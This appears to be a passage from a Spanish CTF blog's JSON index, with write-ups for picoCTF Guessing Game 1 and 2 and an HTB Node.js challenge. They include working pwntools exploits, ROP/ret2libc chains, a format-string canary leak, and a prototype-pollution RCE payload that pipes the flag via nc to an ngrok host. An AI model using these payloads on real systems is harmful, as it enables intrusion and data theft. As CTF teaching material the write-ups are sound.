#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #define BUFSIZE 100 long increment(long in) { return in + 1; } long get_random() { return rand() % BUFSIZE; } int do_stuff() { long ans = get_random(); ans = increment(ans); int res = 0; printf(\"What number would you like to guess?\\n\"); char guess[BUFSIZE]; fgets(guess, BUFSIZE, stdin); long g = atol(guess); if (!g) { printf(\"That's not a valid number!\\n\"); } else { if (g == ans) { printf(\"Congrats! You win! Your prize is this print statement!\\n\\n\"); res = 1; } else { printf(\"Nope!\\n\\n\"); } } return res; } void win() { char winner[BUFSIZE]; printf(\"New winner!\\nName? \"); fgets(winner, 360, stdin); printf(\"Congrats %s\\n\\n\", winner); } int main(int argc, char **argv) { setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); int res; printf(\"Welcome to my guessing game!\\n\\n\"); while (1) { res = do_stuff(); if (res) { win(); } } return 0; }  Primero de todo, vemos que la función get_random está llamando a rand y calculando el resto de dividir dicho número entre 100 (BUFSIZE). Como la semilla es la misma en cada ejecución del proceso, podemos realizar un procedimiento de prueba y error hasta que obtengamos el número correcto (iterando desde 0 hasta 99).\nUna vez que tengamos ese valor, tendremos acceso a la función win:\nvoid win() { char winner[BUFSIZE]; printf(\"New winner!\\nName? \"); fgets(winner, 360, stdin); printf(\"Congrats %s\\n\\n\", winner); }  A pesar de utilizar fgets, esta función es vulnerable a Buffer Overflow porque la variable winner tiene asignado un buffer de 100 bytes (BUFSIZE) y está leyendo 360 bytes de la entrada estándar, de manera que podemos escribir fuera del buffer reservado.\nDebemos recordar las protecciones del binario:\n Tiene NX habilitado, por lo que no podemos ejecutar código arbitrario en la pila (stack). Tiene un stack canary, por lo que habrá un valor aleatorio justo antes de $rip que será comprobado en cada instrucción de retorno para prevenir que $rip se sobrescriba. Si el valor del canario se modifica, entonces el programa termina; en caso contrario, el programa continúa.  No obstante, en este caso el canario no afectará. Aunque la respuesta de checksec muestra que hay un stack canary, el Makefile indica que hay que compilar el código fuente sin canario:\nall: gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c clean: rm vuln  Como NX está habilitado, necesitamos utilizar ROP (Return Oriented Programming). Esta técnica toma direcciones del propio binario que contienen instrucciones (gadgets) que terminan en ret. Consiguientemente, podemos concatenar una lista de gadgets de manera que se ejecuten uno detrás de otro (ROP chain). Esta es la manera de burlar NX, porque estamos ejecutando instrucciones localizadas en el propio binario, no en la pila (stack).\nComencemos realizando fuerza bruta al número. Vemos que el binario es estático, por lo que la función rand dará siempre el mismo valor la primera vez que se ejecute.\nPodemos crear un simple script en Python mediante pwntools para iniciar el proceso, introducir un número y cerrarlo si el número no es correcto:\n#!/usr/bin/env python3 from pwn import * context.binary = ELF('vuln', checksec=False) elf = context.binary number = 0 number_progress = log.progress('Guessing number') for i in range(1, 101): number_progress.status(str(i)) with context.local(log_level='CRITICAL'): p = elf.process() p.sendlineafter(b'What number would you like to guess?\\n', str(i).encode()) if b'Congrats!' in p.recvline(): number = i break p.close() if number == 0: log.critical('Failed to guess number') log.success(f'Guessed number: {number}') p.close()  Después de ejecutar el script, obtenemos que el número es 84:\n$ python3 solve.py [.] Guessing number: 84 [+] Guessed number: 84 [*] Stopped process './vuln' (pid 361991)  Ahora podemos utilizar GDB para encontrar el offset necesario para llegar a $rsp utilizando un patrón:\n$ gdb -q vuln Reading symbols from vuln... (No debugging symbols found in vuln) gef➤ pattern create 500 [+] Generating a pattern of 500 bytes (n=8) aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa [+] Saved as '$_gef1' gef➤ run Starting program: ./vuln Welcome to my guessing game! What number would you like to guess? 84 Congrats! You win! Your prize is this print statement! New winner! Name? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaa taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaa aboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaa aaacjaaaaaackaaaaaaclaaaaaacmaaa Congrats aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaa aaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaa aaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaa Program received signal SIGSEGV, Segmentation fault. 0x0000000000400c8b in win ()  gef➤ pattern offset $rsp [+] Searching for '$rsp' [+] Found at offset 120 (little-endian search) likely [+] Found at offset 113 (big-endian search)  Genial. Ahora podemos empezar a construir la ROP chain. Como es un binario estático, necesitamos realizar una syscall para ejecutar execve(\u0026quot;/bin/sh\u0026quot;, NULL, NULL);. Para ello, necesitamos:\n $rax con un valor de 0x3b $rdi con un puntero a la cadena \u0026quot;/bin/sh\u0026quot; $rsi con un valor de 0 (NULL) $rdx con un valor de 0 (NULL)  Podemos utilizar ROPgadget para encontrar los gadgets del tipo pop \u0026lt;register\u0026gt; ; ret y la syscall:\n$ ROPgadget --binary vuln | grep ': pop r[ads][ix] ; ret$' 0x00000000004163f4 : pop rax ; ret 0x0000000000400696 : pop rdi ; ret 0x000000000044a6b5 : pop rdx ; ret 0x0000000000410ca3 : pop rsi ; ret $ ROPgadget --binary vuln | grep ': syscall$' 0x000000000040137c : syscall  Ahora necesitamos encontrar un espacio de memoria como .bss, para escribir la cadena \u0026quot;/bin/sh\u0026quot;. La dirección de .bss se puede obtener con readelf:\n$ readelf -S vuln | grep '\\.bss' [26] .bss NOBITS 00000000006bc3a0 000bc398  El último gadget que necesitamos es uno para almacenar \u0026quot;/bin/sh\u0026quot; en la dirección de .bss. Necesitamos una instrucción de la forma mov qword ptr [\u0026lt;register\u0026gt;], \u0026lt;register\u0026gt; ; ret. Cualquiera de estas vale:\n$ ROPgadget --binary vuln | grep ': mov .word ptr \\[r..\\], r.. ; ret$' 0x000000000048dd71 : mov qword ptr [rax], rdx ; ret 0x000000000043608b : mov qword ptr [rdi], rcx ; ret 0x0000000000436393 : mov qword ptr [rdi], rdx ; ret 0x0000000000447d7b : mov qword ptr [rdi], rsi ; ret 0x0000000000419127 : mov qword ptr [rdx], rax ; ret 0x000000000047ff91 : mov qword ptr [rsi], rax ; ret  Por ejemplo, podemos utilizar mov qword ptr [rdx], rax ; ret. Ahora, vamos a crear la ROP chain en el exploit de Python y enviarla:\nbss = 0x6bc3a0 pop_rdi_ret = 0x400696 pop_rsi_ret = 0x410ca3 pop_rdx_ret = 0x44a6b5 pop_rax_ret = 0x4163f4 mov_qword_ptr_rdx_rax_ret = 0x419127 syscall = 0x40137c offset = 120 junk = b'A' * offset payload = junk payload += p64(pop_rdx_ret) # $rdx = .bss payload += p64(bss) payload += p64(pop_rax_ret) # $rax = \"/bin/sh\" payload += b'/bin/sh\\0' payload += p64(mov_qword_ptr_rdx_rax_ret) # Store \"/bin/sh\" in .bss payload += p64(pop_rax_ret) # $rax = 0x3b payload += p64(0x3b) payload += p64(pop_rdi_ret) # $rdi = .bss (pointer to \"/bin/sh\") payload += p64(bss) payload += p64(pop_rsi_ret) # $rsi = 0 payload += p64(0) payload += p64(pop_rdx_ret) # $rdx = 0 payload += p64(0) payload += p64(syscall) p.sendlineafter(b'Name?', payload) p.recvline() p.recvline()  Si lo ejecutamos en local, obtendremos una consola de comandos interactiva:\n$ python3 solve.py [┤] Guessing number: 84 [+] Guessed number: 84 [*] Switching to interactive mode $ ls Makefile solve.py vuln vuln.c  Perfecto, ahora lo podemos lanzar a la instancia remota:\n$ python3 solve.py jupiter.challenges.picoctf.org 50581 [┤] Guessing number: 84 [+] Guessed number: 84 [*] Switching to interactive mode $ ls flag.txt vuln vuln.c xinet_startup.sh $ cat flag.txt picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_1ed68bc5575f6be1}  El exploit completo se puede encontrar aquí: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/picoctf/binary-exploitation/guessing-game-1/","section":"ctf","summary":"picoCTF 2020 Mini-Competition. 250 puntos. Binario estático de 64 bits. Buffer Overflow. ROP chain","time":5,"title":"Guessing Game 1"},{"contents":"Se nos proporciona un binario de 32 bits llamado vuln:\nArch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000)  Tenemos también el código fuente en C. Básicamente, lo que hace el programa es pedir un número, compararlo con otro aleatorio y si es el mismo, solicitar un nombre para mostrar un mensaje:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #define BUFSIZE 512 long get_random() { return rand; } int get_version() { return 2; } int do_stuff() { long ans = (get_random() % 4096) + 1; int res = 0; printf(\"What number would you like to guess?\\n\"); char guess[BUFSIZE]; fgets(guess, BUFSIZE, stdin); long g = atol(guess); if (!g) { printf(\"That's not a valid number!\\n\"); } else { if (g == ans) { printf(\"Congrats! You win! Your prize is this print statement!\\n\\n\"); res = 1; } else { printf(\"Nope!\\n\\n\"); } } return res; } void win() { char winner[BUFSIZE]; printf(\"New winner!\\nName? \"); gets(winner); printf(\"Congrats: \"); printf(winner); printf(\"\\n\\n\"); } int main(int argc, char **argv) { setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); int res; printf(\"Welcome to my guessing game!\\n\"); printf(\"Version: %x\\n\\n\", get_version()); while (1) { res = do_stuff(); if (res) { win(); } } return 0; }  El código es muy similar al que aparece en el reto Guessing Game 1 (se aconseja mirarlo antes de continuar).\nLa función get_random es algo diferente. Ahora toma un valor fijo, pero no sabemos cuál es aún. Sin embargo, podemos verlo en GDB:\n$ gdb -q vuln Reading symbols from vuln... (No debugging symbols found in vuln) gef➤ disassemble do_stuff Dump of assembler code for function do_stuff: ... 0x080486e9 : call 0x80484e0 atol@plt 0x080486ee : add esp,0x10 0x080486f1 : mov DWORD PTR [ebp-0x210],eax 0x080486f7 : cmp DWORD PTR [ebp-0x210],0x0 0x080486fe : jne 0x8048714 do_stuff+181 0x08048700 : sub esp,0xc 0x08048703 : lea eax,[ebx-0x1657] 0x08048709 : push eax 0x0804870a : call 0x80484c0 puts@plt 0x0804870f : add esp,0x10 0x08048712 : jmp 0x8048752 do_stuff+243 0x08048714 : mov eax,DWORD PTR [ebp-0x210] 0x0804871a : cmp eax,DWORD PTR [ebp-0x214] 0x08048720 : jne 0x8048740 do_stuff+225 ... End of assembler dump.  La comparación se encuentra en la dirección 0x0804871a, donde se compara $eax con el valor almacenado en $ebp - 0x214. Ponemos un breakpoint aquí y ejecutamos el programa:\ngef➤ break *0x0804871a Breakpoint 1 at 0x804871a gef➤ run Starting program: ./vuln Welcome to my guessing game! Version: 2 What number would you like to guess? 1 Breakpoint 1, 0x0804871a in do_stuff ()  Perfecto, ahora podemos visualizar el contenido de la dirección $ebp - 0x214:\ngef➤ x $ebp-0x214 0xffffd5f4: 0xfffff2a1  Aquí tenemos que darnos cuenta de que 0xfffff2a1 es un número negativo, ya que el bit más significativo es 1. Por tanto, necesitamos calcular el complemento a dos (negar el número y sumarle 1), que es -3423:\nnumber = - ((~0xfffff2a1 \u0026amp; 0xffffffff) + 1) # -3423  Y podemos probarlo:\n$ ./vuln Welcome to my guessing game! Version: 2 What number would you like to guess? -3423 Congrats! You win! Your prize is this print statement! New winner! Name?  Ahora llegamos a la función win:\nvoid win() { char winner[BUFSIZE]; printf(\"New winner!\\nName? \"); gets(winner); printf(\"Congrats: \"); printf(winner); printf(\"\\n\\n\"); }  Esta vez tenemos una llamada a gets (que es vulnerable a Buffer Overflow), y también una vulnerabilidad de Format String, ya que la variable winner se inserta como primer argumento en printf.\nBásicamente, podemos extraer valores de la pila (stack):\n$ ./vuln Welcome to my guessing game! Version: 2 What number would you like to guess? -3423 Congrats! You win! Your prize is this print statement! New winner! Name? %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x. Congrats: 200.f7fae580.804877d.1.fffff2a1.fffff2a1.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.f7ff7500. What number would you like to guess?  La vulnerabilidad de Format String será útil para obtener el valor del stack canary (esta vez sí que hay un stack canary, no como en el reto Guessing Game 1). Para explotar el Buffer Overflow con gets necesitamos añadir el valor del canario antes de $eip para burlar la protección (si no, el canario se verá modificado y el programa terminará).\nUtilicemos un script en Python para adivinar la posición del canario en la pila. La idea es extraer posiciones de la pila hasta que encontremos un valor que tenga la apariencia de un stack canary (termina en byte nulo, 00 en hexadecimal):\n#!/usr/bin/env python3 from pwn import * elf = ELF('vuln', checksec=False) context.binary = elf number = -3423 # - ((~0xfffff2a1 \u0026amp; 0xffffffff) + 1) log.success(f'Guessed number: {number}') p = process(elf.path) def dump(n: int) -\u0026gt; str: p.sendlineafter(b'What number would you like to guess?\\n', str(number).encode()) p.sendlineafter(b'Name? ', f'%{n}$x'.encode()) res = p.recvline().decode().strip() res = res.lstrip('Congrats: ') return res for i in range(200): res = dump(i) if res.endswith('00'): print(i, dump(i)) p.close()  Básicamente estamos extrayendo valores en una determinada posición utilizando formatos como %1$x, %2$x, %3$x, etc. Si probamos con las primeras 200 posiciones y seleccionamos los candidatos a canary (los que terminan en 00), tenemos que el canario está probablemente en la posición 119 (y también en la 135):\n$ python3 solve.py [+] Guessed number: -3423 [+] Starting local process './vuln': pid 64957 1 200 23 f7f22100 31 f7f55000 95 f7f0c000 119 b45b6d00 124 f7f0c000 125 f7f0c000 132 f7f0c000 133 f7f0c000 135 b45b6d00 148 f7f0c000 149 f7f0c000 156 f7f0c000 157 f7f55000 162 f7f0c000 163 f7f0c000 184 8048900 [*] Stopped process './vuln' (pid 64957)  Comprobemos el valor con GDB:\n$ gdb -q vuln Reading symbols from vuln... (No debugging symbols found in vuln) gef➤ break main Breakpoint 1 at 0x804880e gef➤ run Starting program: ./vuln Breakpoint 1, 0x804880e in main ()  gef➤ canary [+] Found AT_RANDOM at 0xffffda2b, reading 4 bytes [+] The canary of process 71318 is 0x3ce1fa00 gef➤ continue Continuing. Welcome to my guessing game! Version: 2 What number would you like to guess? -3423 Congrats! You win! Your prize is this print statement! New winner! Name? %119$x Congrats: 3ce1fa00 What number would you like to guess?  Todo bien, ahora podemos comenzar a explotar el Buffer Overflow. Primero de todo, necesitamos obtener el número de bytes necesario para sobresceibir $eip. Esto se puede hacer de varias formas porque tenemos un stack canary. Por el momento, vamos a mandar payloads y aumentar su tamaño hasta que el proceso termine:\ncanary_position = 119 canary = int(dump(canary_position), 16) log.success(f'Leaked canary: {hex(canary)}') def send_payload(payload: bytes) -\u0026gt; bytes: p.sendlineafter(b'What number would you like to guess?\\n', str(number).encode()) p.sendlineafter(b'Name? ', payload) return p.recvline() for i in range(250): try: send_payload(b'A' * 4 * i) except EOFError: log.info(f'Stack smashing detected with {4 * i - 4} bytes') break p.close()  $ python3 solve.py [+] Guessed number: -3423 [+] Starting local process './vuln': pid 83225 [+] Leaked canary: 0x330c2500 [*] Stack smashing detected with 516 bytes [*] Process './vuln' stopped with exit code -6 (SIGABRT) (pid 83225)  Entonces, se detecta el stack smashing al enviar 516 bytes. Por tanto, necesitamos 512 bytes para llegar al stack canary.\nNótese que se detecta el stack smashing en la iteración previa a la que da EOFError (que significa que el proceso ya no está vivo).\nAhora, podemos añadir el canario en el payload y enviar un patrón mediante cyclic de pwntools. Después, podemos adjuntar GDB al proceso y calcular el offset hasta $eip:\ndef send_payload(payload: bytes) -\u0026gt; bytes: p.sendlineafter(b'What number would you like to guess?\\n', str(number).encode()) p.sendlineafter(b'Name? ', payload) return p.recvline() offset = 512 junk = b'A' * offset payload = junk payload += p32(canary) payload += cyclic(500) gdb.attach(p, gdbscript='continue') send_payload(payload) p.interactive()  Program received signal SIGSEGV, Segmentation fault. 0x61616164 in ?? ()  El registro $eip se sobrescribe con 0x61616164 (daaa), que resulta en un offset de 12:\n$ pwn cyclic -l 0x61616164 12  Ahora, necesitamos crear una ROP chain para efectuar un Ret2Libc, ya que el binario está enlazado dinámicamente:\n$ ldd vuln linux-gate.so.1 (0xf7efb000) libc.so.6 = /lib32/libc.so.6 (0xf7cf9000) /lib/ld-linux.so.2 (0xf7efd000)  Como no sabemos la versión de Glibc de la instancia remota, debemos fugar una dirección de una función de Glibc para buscar su offset en una base de datos de Glibc.\nPara realizar la fuga (leak), podemos llamar a puts en la PLT y fugar el contenido de una dirección de la GOT, por ejemplo la misma función puts. La dirección de retorno será la dirección de win.\n$ gdb -q vuln Reading symbols from vuln... (No debugging symbols found in vuln) gef➤ p puts $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0x80484c0 puts@plt gef➤ p win $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0x804876e win gef➤ quit $ readelf -a vuln | grep puts 08049fdc 00000607 R_386_JUMP_SLOT 00000000 puts@GLIBC_2.0 6: 00000000 0 FUNC GLOBAL DEFAULT UND puts@GLIBC_2.0 (2) 55: 00000000 0 FUNC GLOBAL DEFAULT UND puts@@GLIBC_2.0  Por tanto, la ROP chain es:\noffset_to_canary = 512 offset_to_eip = 12 junk_to_canary = b'A' * offset_to_canary junk_to_eip = b'A' * offset_to_eip payload = junk_to_canary payload += p32(canary) payload += junk_to_eip win_addr = 0x0804876e puts_plt = 0x080484c0 puts_got = 0x08049fdc payload += p32(puts_plt) payload += p32(win_addr) payload += p32(puts_got) send_payload(payload)  Después, lo que recibiremos será la dirección real de puts en Glibc (que tiene 4 bytes de longitud):\np.recvline() puts_addr = u32(p.recvline()[:4].ljust(4, b'\\0')) log.success(f'Leaked puts() address: {hex(puts_addr)}')  Hemos fugado este valor:\n$ python3 solve.py [+] Guessed number: -3423 [+] Starting local process './vuln': pid 148404 [+] Leaked canary: 0x3463de00 [+] Leaked puts() address: 0xf7d73290 [*] Switching to interactive mode New winner! Name? $  Nótese también que se ha llamado a win correctamente. Para comprobar que la dirección fugada es correcta, podemos obtener el offset de puts en Glibc (la local, más tarde para la instancia remota):\n$ readelf -s /lib32/libc.so.6 | grep puts 215: 00071290 531 FUNC GLOBAL DEFAULT 16 _IO_puts@@GLIBC_2.0 461: 00071290 531 FUNC WEAK DEFAULT 16 puts@@GLIBC_2.0 540: 0010c050 1240 FUNC GLOBAL DEFAULT 16 putspent@@GLIBC_2.0 737: 0010dc90 742 FUNC GLOBAL DEFAULT 16 putsgent@@GLIBC_2.10 1244: 0006fa20 381 FUNC WEAK DEFAULT 16 fputs@@GLIBC_2.0 1831: 0006fa20 381 FUNC GLOBAL DEFAULT 16 _IO_fputs@@GLIBC_2.0 2507: 0007ac20 191 FUNC WEAK DEFAULT 16 fputs_unlocked@@GLIBC_2.1  El offset es 0x71290, y la dirección fugada es 0xf7d73290. Ambos números terminan en 290 en hexadecimal, por lo que todo está bien. La dirección base de Glibc es aleatoria debido a ASLR, pero sabemos que esta dirección terminará en 000 en hexadecimal, por lo que la dirección real de puts terminará con los tres últimos dígitos hexadecimales de su offset (290).\nPara calcular la dirección base de Glibc, podemos realizar una simple resta:\np.recvline() puts_addr = u32(p.recvline()[:4].ljust(4, b'\\0')) log.success(f'Leaked puts() address: {hex(puts_addr)}') puts_offset = 0x71290 glibc_base_addr = puts_addr - puts_offset log.success(f'Glibc base address: {hex(glibc_base_addr)}')  $ python3 solve.py [+] Guessed number: -3423 [+] Starting local process './vuln': pid 154121 [+] Leaked canary: 0xf0f7ba00 [+] Leaked puts() address: 0xf7d9d290 [+] Glibc base address: 0xf7d2c000 [*] Switching to interactive mode New winner! Name? $  Ahora podemos efectuar el Ret2Libc. Básicamente, tenemos que llamar a system en Glibc y utilizar \u0026quot;/bin/sh\u0026quot; como argumento. La cadena \u0026quot;/bin/sh\u0026quot; también se encuentra en Glibc:\n$ readelf -s /lib32/libc.so.6 | grep system 258: 00137810 106 FUNC GLOBAL DEFAULT 16 svcerr_systemerr@@GLIBC_2.0 662: 00045420 63 FUNC GLOBAL DEFAULT 16 __libc_system@@GLIBC_PRIVATE 1534: 00045420 63 FUNC WEAK DEFAULT 16 system@@GLIBC_2.0 $ strings -atx /lib32/libc.so.6 | grep /bin/sh 18f352 /bin/sh  Esta es la segunda ROP chain:\npayload = junk_to_canary payload += p32(canary) payload += junk_to_eip system_offset = 0x45420 bin_sh_offset = 0x18f352 system_addr = glibc_base_addr + system_offset bin_sh_addr = glibc_base_addr + bin_sh_offset payload += p32(system_addr) payload += p32(win_addr) payload += p32(bin_sh_addr) p.sendlineafter(b'Name? ', payload) p.recvline() p.recvline() p.interactive()  Y si todo es correcto, deberíamos tener una consola interactiva:\n$ python3 solve.py [+] Guessed number: -3423 [+] Starting local process './vuln': pid 159500 [+] Leaked canary: 0x7baaa300 [+] Leaked puts() address: 0xf7d8b290 [+] Glibc base address: 0xf7d1a000 [*] Switching to interactive mode $ ls Makefile solve.py vuln vuln.c  Ahora es el momento de obtener la versión de Glibc en la instancia remota.\nLo primero que notamos es que el número -3423 no es correcto para la instancia remota. Por tanto, tenemos que realizar un ataque de fuerza bruta, ya que no podemos extraerlo:\nnumber = 0 number_progress = log.progress('Guessed number') for i in range(-4096, 4095): number_progress.status(str(i)) with context.local(log_level='CRITICAL'): p = get_process() p.sendlineafter(b'What number would you like to guess?\\n', str(i).encode()) if b'Congrats!' in p.recvline(): number = i number_progress.success(str(number)) break p.close()  $ python3 solve.py jupiter.challenges.picoctf.org 15815 [|] Guessing number: -3983 [+] Guessed number: -3983  Genial, es -3983 para la instancia remota. Ahora lanzamos el exploit:\n$ python3 solve.py jupiter.challenges.picoctf.org 15815 [+] Guessed number: -3983 [+] Opening connection to jupiter.challenges.picoctf.org on port 15815: Done [+] Leaked canary: 0xf2d4c600 [+] Leaked puts() address: 0xf7e10460 [+] Glibc base address: 0xf7d9f1d0 [*] Switching to interactive mode timeout: the monitored command dumped core [*] Got EOF while reading in interactive $  Evidentemente, no va a funcionar porque la versión de Glibc no es la misma que tenemos en local. Sin embargo, podemos utilizar una base de datos de Glibc donde buscamos por los tres últimos dígitos de la dirección de puts (en este caso, 460):\nVemos que el offset de puts es 0x071460, el offset de system es 0x045350 y el offset de \u0026quot;/bin/sh\u0026quot; es 0x19032b. Si actualizamos estos valores en el exploit, vemos que aún no conseguimos una consola interactiva. podemos probar más versiones de Glibc hasta encontrar la correcta:\n Offset de puts: 0x067460 Offset de system: 0x03ce10 Offset de \u0026quot;/bin/sh\u0026quot;: 0x17b88f  Y finalmente, el exploit funciona en remoto:\n$ python3 solve.py jupiter.challenges.picoctf.org 15815 [+] Guessed number: -3983 [+] Opening connection to jupiter.challenges.picoctf.org on port 15815: Done [+] Leaked canary: 0x70b20e00 [+] Leaked puts() address: 0xf7dc9460 [+] Glibc base address: 0xf7d62000 [*] Switching to interactive mode $ ls flag.txt vuln vuln.c xinet_startup.sh $ cat flag.txt picoCTF{p0p_r0p_4nd_dr0p_1t_506b81e98597929e}  El exploit completo se puede encontrar aquí: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/picoctf/binary-exploitation/guessing-game-2/","section":"ctf","summary":"picoCTF 2020 Mini-Competition. 300 puntos. Binario de 32 bits. Buffer Overflow y Format String. Ret2Libc. Bypass de ASLR y canary","time":9,"title":"Guessing Game 2"},{"contents":"Tenemos una página web con una interfaz bastante chula:\nSolamente existe una entrada de usuario:\nSe trata de una aplicación en Node.js que utiliza pug como motor de plantillas (como se muestra en los archivos disponibles del reto).\nTambién utiliza flat para parsear los datos en JSON, como se muestra en el siguiente archivo llamado routes/index.js:\nconst path = require('path') const express = require('express') const pug = require('pug') const { unflatten } = require('flat') const router = express.Router() router.get('/', (req, res) =\u0026gt; { return res.sendFile(path.resolve('views/index.html')) }) router.post('/api/submit', (req, res) =\u0026gt; { const { artist } = unflatten(req.body) if ( artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell') ) { return res.json({ response: pug.compile( 'span Hello #{user}, thank you for letting us know!' )({ user: 'guest' }) }) } return res.json({ response: 'Please provide us with the full name of an existing member.' }) }) module.exports = router  Existe una vulnerabilidad conocida de unflatten del módulo flat. Se trata de Prototype Pollution, que básicamente nos permite definir variables globales.\nEsta vulnerabilidad combinada con un motor de plantillas como pug (o handlebars) puede desembocar en ejecución remota de comandos (RCE) debido a una funcionalidad de depuración. Todo esto está claramente explicado en https://blog.p6.is/AST-Injection/#Pug.\nPodemos probar que se da Prototype Pollution ejecutando el reto en un contenedor de Docker y añadiendo un simple console.log(x) después de la llamada a unflatten.\nAhora, si ponemos el siguiente documento JSON, console.log(x) mostrará true en el registro de salida del servidor (ahora x es una variable global):\n{ \"__proto__.x\": true }  Entonces, podemos probar algunos payloads con pug siguiendo el artículo del blog anterior. Con el siguiente documento, podemos poner texto después de un bloque de plantilla (por ejemplo #{user} en el archivo de JavaScript mostrado arriba):\n{ \"artist.name\": \"Haigh\", \"__proto__.block\": { \"type\": \"Text\", \"val\": \"RandomText\" } }  $ curl 157.245.43.98:31191/api/submit -H 'Content-Type: application/json' -d '{\"artist.name\":\"Haigh\",\"__proto__.block\":{\"type\":\"Text\",\"val\":\"RandomText\"}}' {\"response\":\"\u0026lt;span\u0026gt;Hello guestRandomText, thank you for letting us know!\u0026lt;/span\u0026gt;\"}  Vemos que guest va seguido de RandomText por lo que somos capaces de usar Prototype Pollution para realizar AST Injection y modificar el funcionamiento de pug.\nNótese que hemos usado Haigh como artist.name porque necesitamos que artist.name.includes('Haigh') devuelva true para hacer que pug renderice el mensaje.\nExiste una forma de ganar RCE utilizando line en vez de val. Sin embargo, el mensaje no se mostrará en la respuesta del servidor. Una manera rápida de conseguir la flag es utilizar una reverse shell por TCP. Pero esto es matar moscas a cañonazos porque solamente necesitamos la flag (que aunque el nombre de archivo tenga caracteres aleatorios, podemos utilizar wildcards).\nComo la instancia remota es pública, necesitamos utilizar una dirección IP pública para recibir la conexión. Aquí es donde tiene sentido el uso de ngrok.\nPodemos ponernos a la escucha con nc en el puerto 4444, por ejemplo. Y después iniciar ngrok:\n$ ngrok tcp 4444 ngrok Session Status online Account Rocky (Plan: Free) Version 2.3.40 Region United States (us) Latency 120.893ms Web Interface http://127.0.0.1:4040 Forwarding tcp://0.tcp.ngrok.io:14109 - localhost:4444 Connections ttl opn rt1 rt5 p50 p90 1 0 0.00 0.00 0.00 0.00  Como resultado, hemos creado un túnel desde nuestro socket privado hasta el socket público gestionado por ngrok.\nEste es el payload necesario para conseguir la flag (utilizando un wildcard):\n{ \"artist.name\": \"Haigh\", \"__proto__.block\": { \"type\": \"Text\", \"line\": \"process.mainModule.require(\\\"child_process\\\").execSync(\\\"cat /app/flag* | nc 0.tcp.ngrok.io 14109\\\")\" } }  $ curl 157.245.43.98:31191/api/submit -H 'Content-Type: application/json' -d '{\"artist.name\":\"Haigh\",\"__proto__.block\":{\"type\":\"Text\",\"line\":\"process.mainModule.require(\\\"child_process\\\").execSync(\\\"cat /app/flag* | nc 0.tcp.ngrok.io 14109\\\")\"}}' {\"response\":\"\u0026lt;span\u0026gt;Hello guestRandomText, thank you for letting us know!\u0026lt;/span\u0026gt;\"}  $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from ::1. Ncat: Connection from ::1:59447. HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}  También es posible conseguir una reverse shell. Este es el payload:\n{ \"artist.name\": \"Haigh\", \"__proto__.block\": { \"type\": \"Text\", 